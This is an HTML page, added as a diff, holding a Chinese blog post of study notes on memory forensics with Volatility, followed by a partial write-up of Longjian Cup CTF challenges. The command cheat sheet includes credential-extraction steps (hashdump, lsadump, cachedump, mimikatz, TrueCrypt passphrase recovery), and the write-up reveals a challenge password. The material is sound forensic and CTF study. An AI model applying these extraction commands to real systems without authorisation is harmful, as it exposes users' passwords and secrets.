@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"chaserw.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="最近的CTF遇到了内存取证题，之前没有系统学习过，赛后来补一波笔记 工具Volatility简介Volatility是一款开源的，基于Python开发的内存取证工具集，可以分析内存中的各种数据。Volatility支持对32位或64位Windows、Linux、Mac、Android操作系统的RAM数据进行提取与分析。 安装kali自带这个工具，但我的kali 2019.4没有(可能是因为mini">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内存取证">
+<meta property="og:url" content="http://chaserw.github.io/2021/09/16/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/index.html">
+<meta property="og:site_name" content="chaser&#39;s Blog">
+<meta property="og:description" content="最近的CTF遇到了内存取证题，之前没有系统学习过，赛后来补一波笔记 工具Volatility简介Volatility是一款开源的，基于Python开发的内存取证工具集，可以分析内存中的各种数据。Volatility支持对32位或64位Windows、Linux、Mac、Android操作系统的RAM数据进行提取与分析。 安装kali自带这个工具，但我的kali 2019.4没有(可能是因为mini">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol8.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol9.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol10.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol11.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol12.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol13.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol14.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol15.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol16.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol17.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol18.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol19.png">
+<meta property="article:published_time" content="2021-09-16T05:15:38.000Z">
+<meta property="article:modified_time" content="2021-09-16T05:49:01.443Z">
+<meta property="article:author" content="chaser">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Write-Up">
+<meta property="article:tag" content="内存取证">
+<meta property="article:tag" content="流量分析">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol1.png">
+
+<link rel="canonical" href="http://chaserw.github.io/2021/09/16/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>内存取证 | chaser's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <script src="/live2d-widget/autoload.js"></script>
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">chaser's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/chaserw" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://chaserw.github.io/2021/09/16/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="chaser">
+      <meta itemprop="description" content="文档工程师 摸鱼砖家">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="chaser's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          内存取证
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-09-16 13:15:38 / 修改时间：13:49:01" itemprop="dateCreated datePublished" datetime="2021-09-16T13:15:38+08:00">2021-09-16</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/" itemprop="url" rel="index"><span itemprop="name">内存取证</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>最近的CTF遇到了内存取证题，之前没有系统学习过，赛后来补一波笔记</p>
+<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><h5 id="Volatility简介"><a href="#Volatility简介" class="headerlink" title="Volatility简介"></a>Volatility简介</h5><p>Volatility是一款开源的，基于Python开发的内存取证工具集，可以分析内存中的各种数据。Volatility支持对32位或64位Windows、Linux、Mac、Android操作系统的RAM数据进行提取与分析。</p>
+<h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><p>kali自带这个工具，但我的kali 2019.4没有(可能是因为mini安装)，因此自己在windows上折腾了一下安装，推荐下载官方打包的<a target="_blank" rel="noopener" href="http://downloads.volatilityfoundation.org/releases/2.6/volatility_2.6_win64_standalone.zip">可执行文件版</a>，源码版的虽然也能用，但是需要自己安装第三方依赖库，distorm3这个依赖库安装起来比较麻烦。</p>
+<span id="more"></span>
+
+<h5 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看imagerinfo获取操作系统类型</span></span><br><span class="line">volatility -f &lt;filename&gt; imageinfo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定操作系统类型进行其他操作</span></span><br><span class="line">volatility -f &lt;filename&gt; --profile &lt;ostype&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看进程</span></span><br><span class="line">volatility -f &lt;filename&gt; --profile &lt;ostype&gt; pslist</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看文件</span></span><br><span class="line">volatility -f &lt;filename&gt; --profile &lt;ostype&gt; filescan | grep -E <span class="string">&quot;txt|xml|png|jpg|gif|zip|rar|7z|pdf|doc|docx|php|py|flag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 桌面</span></span><br><span class="line">volatility -f &lt;filename&gt; --profile &lt;ostype&gt; filescan | grep -E <span class="string">&quot;Desktop&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出文件</span></span><br><span class="line">volatility -f &lt;filename&gt; --profile &lt;ostype&gt; dumpfiles -Q &lt;virtual address&gt; -D &lt;savedir&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取系统用户名</span></span><br><span class="line">volatility -f &lt;filename&gt; --profile &lt;ostype&gt; printkey -K <span class="string">&quot;SAM\Domains\Account\Users\Names&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看注册表</span></span><br><span class="line">volatility -f &lt;filename&gt; --profile &lt;ostype&gt; hivelist</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取用户密码</span></span><br><span class="line">volatility -f &lt;filename&gt; --profile &lt;ostype&gt; hashdump -y &lt;注册表 system 的 virtual 地址&gt; -s &lt;SAM 的 virtual 地址&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取IE浏览器历史记录</span></span><br><span class="line">volatility -f &lt;filename&gt; --profile &lt;ostype&gt; iehistory</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看网络连接</span></span><br><span class="line">volatility -f &lt;filename&gt; --profile &lt;ostype&gt; netscan</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将内存中的某个进程数据以 dmp 的格式保存出来 </span></span><br><span class="line">volatility -f &lt;filename&gt; --profile &lt;ostype&gt; memdump -p &lt;pid&gt; -D &lt;savedir&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看命令行历史记录</span></span><br><span class="line">volatility -f &lt;filename&gt; --profile &lt;ostype&gt; cmdscan</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看进程命令行参数</span></span><br><span class="line">volatility -f &lt;filename&gt; --profile &lt;ostype&gt; cmdline</span><br></pre></td></tr></table></figure>
+
+<h5 id="支持的插件列表"><a href="#支持的插件列表" class="headerlink" title="支持的插件列表"></a>支持的插件列表</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">amcache             <span class="comment"># 查看 AmCache 应用程序痕迹信息</span></span><br><span class="line">apihooks            <span class="comment"># 检测内核及进程的内存空间中的 API hook</span></span><br><span class="line">atoms               <span class="comment"># 列出会话及窗口站 atom 表</span></span><br><span class="line">atomscan            <span class="comment"># Atom 表的池扫描(Pool scanner)</span></span><br><span class="line">auditpol            <span class="comment"># 列出注册表 HKLM\SECURITY\Policy\PolAdtEv 的审计策略信息</span></span><br><span class="line">bigpools            <span class="comment"># 使用 BigPagePoolScanner 转储大分页池(big page pools)</span></span><br><span class="line">bioskbd             <span class="comment"># 从实时模式内存中读取键盘缓冲数据(早期电脑可以读取出 BIOS 开机密码)</span></span><br><span class="line">cachedump           <span class="comment"># 获取内存中缓存的域帐号的密码哈希</span></span><br><span class="line">callbacks           <span class="comment"># 打印全系统通知例程</span></span><br><span class="line">clipboard           <span class="comment"># 提取 Windows 剪贴板中的内容</span></span><br><span class="line">cmdline             <span class="comment"># 显示进程命令行参数</span></span><br><span class="line">cmdscan             <span class="comment"># 提取执行的命令行历史记录（扫描_COMMAND_HISTORY 信息）</span></span><br><span class="line">connections         <span class="comment"># 打印系统打开的网络连接(仅支持 Windows XP 和 2003)</span></span><br><span class="line">connscan            <span class="comment"># 打印 TCP 连接信息</span></span><br><span class="line">consoles            <span class="comment"># 提取执行的命令行历史记录（扫描_CONSOLE_INFORMATION 信息）</span></span><br><span class="line">crashinfo           <span class="comment"># 提取崩溃转储信息</span></span><br><span class="line">deskscan            <span class="comment"># tagDESKTOP 池扫描(Poolscaner)</span></span><br><span class="line">devicetree          <span class="comment"># 显示设备树信息</span></span><br><span class="line">dlldump             <span class="comment"># 从进程地址空间转储动态链接库</span></span><br><span class="line">dlllist             <span class="comment"># 打印每个进程加载的动态链接库列表</span></span><br><span class="line">driverirp           <span class="comment"># IRP hook 驱动检测</span></span><br><span class="line">drivermodule        <span class="comment"># 关联驱动对象至内核模块</span></span><br><span class="line">driverscan          <span class="comment"># 驱动对象池扫描</span></span><br><span class="line">dumpcerts           <span class="comment"># 提取 RAS 私钥及 SSL 公钥</span></span><br><span class="line">dumpfiles           <span class="comment"># 提取内存中映射或缓存的文件</span></span><br><span class="line">dumpregistry        <span class="comment"># 转储内存中注册表信息至磁盘</span></span><br><span class="line">editbox             <span class="comment"># 查看 Edit 编辑控件信息 (Listbox 正在实验中)</span></span><br><span class="line">envars              <span class="comment"># 显示进程的环境变量</span></span><br><span class="line">eventhooks          <span class="comment"># 打印 Windows 事件 hook 详细信息</span></span><br><span class="line">evtlogs             <span class="comment"># 提取 Windows 事件日志(仅支持 XP/2003)</span></span><br><span class="line">filescan            <span class="comment"># 提取文件对象（file objects）池信息</span></span><br><span class="line">gahti               <span class="comment"># 转储用户句柄（handle）类型信息</span></span><br><span class="line">gditimers           <span class="comment"># 打印已安装的 GDI 计时器 (timers) 及回调(callbacks)</span></span><br><span class="line">gdt                 <span class="comment"># 显示全局描述符表(Global Descriptor Table)</span></span><br><span class="line">getservicesids      <span class="comment"># 获取注册表中的服务名称并返回 SID 信息</span></span><br><span class="line">getsids             <span class="comment"># 打印每个进程的 SID 信息</span></span><br><span class="line">handles             <span class="comment"># 打印每个进程打开的句柄的列表</span></span><br><span class="line">hashdump            <span class="comment"># 转储内存中的 Windows 帐户密码哈希(LM/NTLM)</span></span><br><span class="line">hibinfo             <span class="comment"># 转储休眠文件信息</span></span><br><span class="line">hivedump            <span class="comment"># 打印注册表配置单元信息</span></span><br><span class="line">hivelist            <span class="comment"># 打印注册表配置单元列表</span></span><br><span class="line">hivescan            <span class="comment"># 注册表配置单元池扫描</span></span><br><span class="line">hpakextract         <span class="comment"># 从 HPAK 文件（Fast Dump 格式）提取物理内存数据</span></span><br><span class="line">hpakinfo            <span class="comment"># 查看 HPAK 文件属性及相关信息</span></span><br><span class="line">idt                 <span class="comment"># 显示中断描述符表(Interrupt Descriptor Table)</span></span><br><span class="line">iehistory           <span class="comment"># 重建 IE 缓存及访问历史记录</span></span><br><span class="line">imagecopy           <span class="comment"># 将物理地址空间导出原生 DD 镜像文件</span></span><br><span class="line">imageinfo           <span class="comment"># 查看 / 识别镜像信息</span></span><br><span class="line">impscan             <span class="comment"># 扫描对导入函数的调用</span></span><br><span class="line">joblinks            <span class="comment"># 打印进程任务链接信息</span></span><br><span class="line">kdbgscan            <span class="comment"># 搜索和转储潜在 KDBG 值</span></span><br><span class="line">kpcrscan            <span class="comment"># 搜索和转储潜在 KPCR 值</span></span><br><span class="line">ldrmodules          <span class="comment"># 检测未链接的动态链接 DLL</span></span><br><span class="line">lsadump             <span class="comment"># 从注册表中提取 LSA 密钥信息（已解密）</span></span><br><span class="line">machoinfo           <span class="comment"># 转储 Mach-O 文件格式信息</span></span><br><span class="line">malfind             <span class="comment"># 查找隐藏的和插入的代码</span></span><br><span class="line">mbrparser           <span class="comment"># 扫描并解析潜在的主引导记录(MBR)</span></span><br><span class="line">memdump             <span class="comment"># 转储进程的可寻址内存</span></span><br><span class="line">memmap              <span class="comment"># 打印内存映射</span></span><br><span class="line">messagehooks        <span class="comment"># 桌面和窗口消息钩子的线程列表</span></span><br><span class="line">mftparser           <span class="comment"># 扫描并解析潜在的 MFT 条目</span></span><br><span class="line">moddump             <span class="comment"># 转储内核驱动程序到可执行文件的示例</span></span><br><span class="line">modscan             <span class="comment"># 内核模块池扫描</span></span><br><span class="line">modules             <span class="comment"># 打印加载模块的列表</span></span><br><span class="line">multiscan           <span class="comment"># 批量扫描各种对象</span></span><br><span class="line">mutantscan          <span class="comment"># 对互斥对象池扫描</span></span><br><span class="line">notepad             <span class="comment"># 查看记事本当前显示的文本</span></span><br><span class="line">objtypescan         <span class="comment"># 扫描窗口对象类型对象</span></span><br><span class="line">patcher             <span class="comment"># 基于页面扫描的补丁程序内存</span></span><br><span class="line">poolpeek            <span class="comment"># 可配置的池扫描器插件</span></span><br><span class="line">printkey            <span class="comment"># 打印注册表项及其子项和值</span></span><br><span class="line">privs               <span class="comment"># 显示进程权限</span></span><br><span class="line">procdump            <span class="comment"># 进程转储到一个可执行文件示例</span></span><br><span class="line">pslist              <span class="comment"># 按照 EPROCESS 列表打印所有正在运行的进程</span></span><br><span class="line">psscan              <span class="comment"># 进程对象池扫描</span></span><br><span class="line">pstree              <span class="comment"># 以树型方式打印进程列表</span></span><br><span class="line">psxview             <span class="comment"># 查找带有隐藏进程的所有进程列表</span></span><br><span class="line">qemuinfo            <span class="comment"># 转储 Qemu 信息</span></span><br><span class="line">raw2dmp             <span class="comment"># 将物理内存原生数据转换为 windbg 崩溃转储格式</span></span><br><span class="line">screenshot          <span class="comment"># 基于 GDI Windows 的虚拟屏幕截图保存</span></span><br><span class="line">servicediff         <span class="comment"># Windows 服务列表(ala Plugx)</span></span><br><span class="line">sessions            <span class="comment"># _MM_SESSION_SPACE 的详细信息列表(用户登录会话)</span></span><br><span class="line">shellbags           <span class="comment"># 打印 Shellbags 信息</span></span><br><span class="line">shimcache           <span class="comment"># 解析应用程序兼容性 Shim 缓存注册表项</span></span><br><span class="line">shutdowntime        <span class="comment"># 从内存中的注册表信息获取机器关机时间</span></span><br><span class="line">sockets             <span class="comment"># 打印已打开套接字列表</span></span><br><span class="line">sockscan            <span class="comment"># TCP 套接字对象池扫描</span></span><br><span class="line">ssdt                <span class="comment"># 显示 SSDT 条目</span></span><br><span class="line">strings             <span class="comment"># 物理到虚拟地址的偏移匹配(需要一些时间，带详细信息)</span></span><br><span class="line">svcscan             <span class="comment"># windows 服务列表扫描</span></span><br><span class="line">symlinkscan         <span class="comment"># 符号链接对象池扫描</span></span><br><span class="line">thrdscan            <span class="comment"># 线程对象池扫描</span></span><br><span class="line">threads             <span class="comment"># 调查_ETHREAD 和_KTHREADs</span></span><br><span class="line">timeliner           <span class="comment"># 创建内存中的各种痕迹信息的时间线</span></span><br><span class="line">timers              <span class="comment"># 打印内核计时器及关联模块的 DPC</span></span><br><span class="line">truecryptmaster     <span class="comment"># 恢复 TrueCrypt 7.1a 主密钥</span></span><br><span class="line">truecryptpassphrase <span class="comment"># 查找并提取 TrueCrypt 密码</span></span><br><span class="line">truecryptsummary    <span class="comment"># TrueCrypt 摘要信息</span></span><br><span class="line">unloadedmodules     <span class="comment"># 打印卸载的模块信息列表</span></span><br><span class="line">userassist          <span class="comment"># 打印注册表中 UserAssist 相关信息</span></span><br><span class="line">userhandles         <span class="comment"># 转储用户句柄表</span></span><br><span class="line">vaddump             <span class="comment"># 转储 VAD 数据为文件</span></span><br><span class="line">vadinfo             <span class="comment"># 转储 VAD 信息</span></span><br><span class="line">vadtree             <span class="comment"># 以树形方式显示 VAD 树信息</span></span><br><span class="line">vadwalk             <span class="comment"># 显示遍历 VAD 树</span></span><br><span class="line">vboxinfo            <span class="comment"># 转储 Virtualbox 信息（虚拟机）</span></span><br><span class="line">verinfo             <span class="comment"># 打印 PE 镜像中的版本信息</span></span><br><span class="line">vmwareinfo          <span class="comment"># 转储 VMware VMSS/VMSN 信息</span></span><br><span class="line">volshell            <span class="comment"># 内存镜像中的 shell</span></span><br><span class="line">windows             <span class="comment"># 打印桌面窗口(详细信息)</span></span><br><span class="line">wintree             <span class="comment"># Z 顺序打印桌面窗口树</span></span><br><span class="line">wndscan             <span class="comment"># 池扫描窗口站</span></span><br><span class="line">yarascan            <span class="comment"># 以 Yara 签名扫描进程或内核内存</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="实战题目"><a href="#实战题目" class="headerlink" title="实战题目"></a>实战题目</h4><h5 id="陇剑杯内存分析"><a href="#陇剑杯内存分析" class="headerlink" title="陇剑杯内存分析"></a>陇剑杯内存分析</h5><p>查看操作系统类型</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol1.png"></p>
+<p>这题各种操作都尝试了一遍没什么发现，后来根据提示才发现lsadump可直接获取flag</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol2.png"></p>
+<p>安装mimikatz插件后，直接获取密码/flag</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol7.png"></p>
+<p>查看文件的时候发现桌面上有一个HUAWEI的可执行文件</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol8.png"></p>
+<p>dump下来</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol9.png"></p>
+<p>修改文件后缀位exe后打开发现是winrar自解压文件，解压得到</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol10.png"></p>
+<p>通过搜索发现是华为手机助手备份文件，在github发现解密脚本：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/RealityNet/kobackupdec">https://github.com/RealityNet/kobackupdec</a></p>
+<p>需要输入密码，现在只有之前获取的flag可以试试，结合<code>tips.txt</code>的提示<code>no space but underline</code>，密码应该是：<code>W31C0M3_T0_THiS_34SY_F0R3NSiCX</code></p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol11.png"></p>
+<p>查看解密的图片获取flag</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol12.png"></p>
+<h5 id="陇剑杯Wifi"><a href="#陇剑杯Wifi" class="headerlink" title="陇剑杯Wifi"></a>陇剑杯Wifi</h5><p>查看操作系统类型</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol3.png"></p>
+<p>查看可疑文件</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol4.png"></p>
+<p>dump这两个文件，解压<code>My_Wifi.zip</code>，发现需要密码</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/mem_vol5.png"></p>
+<p>winhex查看压缩包发现提示</p>
